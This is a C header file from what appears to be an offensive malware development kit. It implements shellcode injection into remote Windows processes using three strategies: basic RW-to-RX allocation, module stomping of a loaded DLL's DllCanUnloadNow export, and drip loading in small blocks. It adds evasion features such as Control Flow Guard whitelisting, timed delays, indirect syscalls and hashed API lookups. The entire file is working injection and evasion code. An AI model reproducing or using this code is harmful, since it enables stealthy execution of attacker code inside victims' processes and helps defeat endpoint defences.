/**
 * @file Allocators.h
 * @author Ky4meru (@ky4meru)
 * @brief Shellcode allocation strategies.
 * @version 0.4
 * @date 2026-09-15
 * @copyright Copyright (c) 2024-2026
 */

#ifndef _MDK_ALLOCATORS_H_
#define _MDK_ALLOCATORS_H_

#include "Processes.h"
#include "Wrappers.h"

/**
 * @brief Finds and allocates a memory hole within a +/- 0x70000000 range of a target address in a remote process.
 *
 * This is useful for allocating memory close to a target address for relative jumps or other proximity-dependent
 * operations.
 *
 * @param phd The handle to the target process.
 * @param addr The target address around which to search for a memory hole.
 * @param size The size of the memory region to allocate, in bytes.
 * @return The base address of the allocated memory, or NULL if no suitable region was found.
 */
MDK_TEXT_SEC(MDK) static LPVOID MdkFindMemoryHole(_In_ HANDLE phd, _In_ LPVOID addr, _In_ SIZE_T size)
{
    LPVOID hole = NULL;
    LPVOID result = NULL;

    for (hole = MDK_CAST_VPTR((MDK_CAST_UPTR(addr) & 0xFFFFFFFFFFF70000) - 0x70000000); hole < MDK_CAST_VPTR(MDK_CAST_UPTR(addr) + 0x70000000); hole = MDK_CAST_VPTR(MDK_CAST_UPTR(hole) + 0x10000))
    {
        if ((result = MdkVirtualAllocEx(phd, hole, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        {
            return result;
        }
    }

    return NULL;
}

/**
 * @brief Allocates executable memory in a remote process and writes shellcode into it.
 *
 * The function allocates a read-write region, writes the shellcode, optionally whitelists the region in Control Flow
 * Guard, and changes the memory protection to read-execute.
 *
 * @param phd The handle to the target process.
 * @param shellcode The pointer to the shellcode buffer to write.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard before changing protection.
 * @return The base address of the allocated shellcode, or NULL if any step fails.
 */
MDK_TEXT_SEC(MDK) static LPVOID MdkBasicLoadShellcode(_In_ HANDLE phd, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_LOG_DEBUG("Calling with (phd=0x%p, shellcode=0x%p, size=%zu, ms=%lu, cfg=%d)", phd, shellcode, size, ms, cfg);

    DWORD old = 0;
    LPVOID payload = NULL;

    if (!(payload = MdkVirtualAllocEx(phd, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        MDK_LOG_DEBUG("Failed to allocate memory");
        return NULL;
    }

    MdkSleep(ms);

    if (!MdkWriteProcessMemory(phd, payload, shellcode, size, NULL))
    {
        MDK_LOG_DEBUG("Failed to write memory");
        return NULL;
    }

    MdkSleep(ms);

    if (cfg && !MdkSetProcessValidCallTargets(phd, payload, size))
    {
        MDK_LOG_DEBUG("Failed to set valid call target");
        return NULL;
    }

    MdkSleep(ms);

    if (!MdkVirtualProtectEx(phd, payload, size, PAGE_EXECUTE_READ, &old))
    {
        MDK_LOG_DEBUG("Failed to protect memory");
        return NULL;
    }

    MDK_LOG_DEBUG("Returning 0x%p", payload);

    return payload;
}

/**
 * @brief Loads a module into a remote process and overwrites one of its exports with shellcode.
 *
 * The function loads the specified DLL via MdkLoadLibraryA, resolves the DllCanUnloadNow export as the stomping target,
 * and overwrites it with the provided shellcode. This technique avoids allocating new executable memory regions by
 * reusing an existing legitimate module's code section.
 *
 * @param phd The handle to the target process.
 * @param path The file path of the DLL to load as stomping target.
 * @param shellcode The pointer to the shellcode buffer to write.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the entry point in Control Flow Guard before changing protection.
 * @return The address of the overwritten export in the remote process, or NULL if any step fails.
 */
MDK_TEXT_SEC(MDK) static LPVOID MdkModuleStompingLoadShellcode(_In_ HANDLE phd, _In_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_DECL_PROC(DllCanUnloadNow);

    DWORD old = 0;
    HMODULE mod = NULL;
    LPVOID ep = NULL;

    if (!(mod = MdkLoadLibraryA(phd, path)))
    {
        return NULL;
    }

    MdkSleep(ms);

    if (!(ep = MdkGetRemoteProcAddressByHash(phd, mod, MDK_HASH_DllCanUnloadNow)))
    {
        return NULL;
    }

    MdkSleep(ms);

    if (!MdkVirtualProtectEx(phd, ep, size, PAGE_READWRITE, &old))
    {
        return NULL;
    }

    MdkSleep(ms);

    if (!MdkWriteProcessMemory(phd, ep, shellcode, size, NULL))
    {
        return NULL;
    }

    MdkSleep(ms);

    if (cfg && !MdkSetProcessValidCallTargets(phd, ep, size))
    {
        return NULL;
    }

    MdkSleep(ms);

    if (!MdkVirtualProtectEx(phd, ep, size, PAGE_EXECUTE_READ, &old))
    {
        return NULL;
    }

    return ep;
}

/**
 * @brief Writes shellcode into a remote process using small incremental block allocations.
 *
 * @param phd The handle to the target process.
 * @param addr The pointer to a variable that receives or provides the base address of the allocated region. Set to NULL on the first call.
 * @param shellcode The pointer to the shellcode buffer to write.
 * @param size The size of the shellcode buffer, in bytes.
 * @param prot The final memory protection to apply to each block after writing.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists each block in Control Flow Guard before changing protection.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkDripLoadShellcode(_In_ HANDLE phd, _Inout_ LPVOID* addr, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD prot, _In_ DWORD ms, _In_ BOOL cfg)
{
    MDK_DECL_PROC(NtQueryVirtualMemory);

    DWORD i = 0;
    DWORD j = 0;
    DWORD old = 0;
    LPBYTE payload = (LPBYTE)shellcode;
    LPVOID base = NULL;
    LPVOID bases[10];
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T blk = 0x10000;
    SIZE_T cnt = size / blk + 1;
    SIZE_T off = 0;
    SIZE_T wrt = 0;

    MdkZeroMemory(&mbi, sizeof(mbi));

    bases[0] = MDK_CAST_VPTR(0x00000000DDDD0000);
    bases[1] = MDK_CAST_VPTR(0x0000000010000000);
    bases[2] = MDK_CAST_VPTR(0x0000000021000000);
    bases[3] = MDK_CAST_VPTR(0x0000000032000000);
    bases[4] = MDK_CAST_VPTR(0x0000000043000000);
    bases[5] = MDK_CAST_VPTR(0x0000000050000000);
    bases[6] = MDK_CAST_VPTR(0x0000000022000000);
    bases[7] = MDK_CAST_VPTR(0x0000000040000000);
    bases[8] = MDK_CAST_VPTR(0x0000000041000000);
    bases[9] = MDK_CAST_VPTR(0x0000000042000000);

    if (*addr == NULL)
    {
        for (i = 0; i < sizeof(bases) / sizeof(bases[0]); ++i)
        {
            for (j = 0; j < cnt; ++j)
            {
                base = MDK_CAST_VPTR(MDK_CAST_UPTR(bases[i]) + j * blk);

                if (!MDK_SUCCEEDED(MDK_INDIRECT_SYSCALL(NtQueryVirtualMemory, phd, base, 0, &mbi, sizeof(mbi), &wrt)) || mbi.State != MEM_FREE)
                {
                    break;
                }

                MdkSleep(ms);
            }

            if (j == cnt)
            {
                *addr = bases[i];
                MdkZeroMemory(&mbi, sizeof(mbi));
                break;
            }
        }

        if (*addr == NULL)
        {
            return FALSE;
        }

        for (i = 0; i < cnt; ++i)
        {
            base = MDK_CAST_VPTR(MDK_CAST_UPTR(*addr) + i * blk);

            if (!MdkVirtualAllocEx(phd, base, blk, MEM_RESERVE, PAGE_NOACCESS))
            {
                return FALSE;
            }

            MdkSleep(ms);
        }
    }

    for (i = 0; i < cnt; ++i)
    {
        off = i * blk;
        base = MDK_CAST_VPTR(MDK_CAST_UPTR(*addr) + off);

        MdkSleep(ms);

        if (!(base = MdkVirtualAllocEx(phd, base, blk, MEM_COMMIT, PAGE_READWRITE)))
        {
            return FALSE;
        }

        if (off + blk > size)
        {
            blk = size - off;
        }

        MdkSleep(ms);

        if (!MdkWriteProcessMemory(phd, base, &payload[off], blk, &wrt))
        {
            return FALSE;
        }

        MdkSleep(ms);

        if (cfg && !MdkSetProcessValidCallTargets(phd, base, blk))
        {
            return FALSE;
        }

        MdkSleep(ms);

        if (!MdkVirtualProtectEx(phd, base, blk, prot, &old))
        {
            return FALSE;
        }
    }

    return TRUE;
}

/**
 * @brief Loads shellcode into a remote process using the specified allocation strategy.
 *
 * This function dispatches to the appropriate allocator based on the provided MDK_ALLOCATOR value. For module stomping,
 * the path parameter specifies the DLL to stomp. For drip loading, the addr parameter tracks the base address across
 * calls. The allocated shellcode address is written back through the addr parameter.
 *
 * @param phd The handle to the target process.
 * @param addr The pointer to a variable that receives the base address of the allocated shellcode.
 * @param alloc The allocation strategy to use.
 * @param path The file path of the DLL to stomp. Only used with MdkModuleStompingAllocation, ignored otherwise.
 * @param shellcode The pointer to the shellcode buffer to write.
 * @param size The size of the shellcode buffer, in bytes.
 * @param ms The delay in milliseconds between each operation.
 * @param cfg If nonzero, whitelists the allocated region in Control Flow Guard.
 * @return If the function succeeds, the return value is nonzero.
 */
MDK_TEXT_SEC(MDK) static BOOL MdkLoadShellcode(_In_ HANDLE phd, _Inout_ LPVOID* addr, _In_ MDK_ALLOCATOR alloc, _In_opt_ LPCSTR path, _In_ LPCVOID shellcode, _In_ SIZE_T size, _In_ DWORD ms, _In_ BOOL cfg)
{
    switch (alloc)
    {
    case MdkBasicLoadAllocation:
    {
        *addr = MdkBasicLoadShellcode(phd, shellcode, size, ms, cfg);
        break;
    }
    case MdkModuleStompingAllocation:
    {
        *addr = MdkModuleStompingLoadShellcode(phd, path, shellcode, size, ms, cfg);
        break;
    }
    case MdkDripLoadAllocation:
    {
        return MdkDripLoadShellcode(phd, addr, shellcode, size, PAGE_EXECUTE_READ, ms, cfg);
    }
    default:
    {
        return FALSE;
    }
    }

    return *addr != NULL;
}

#endif // _MDK_ALLOCATORS_H_
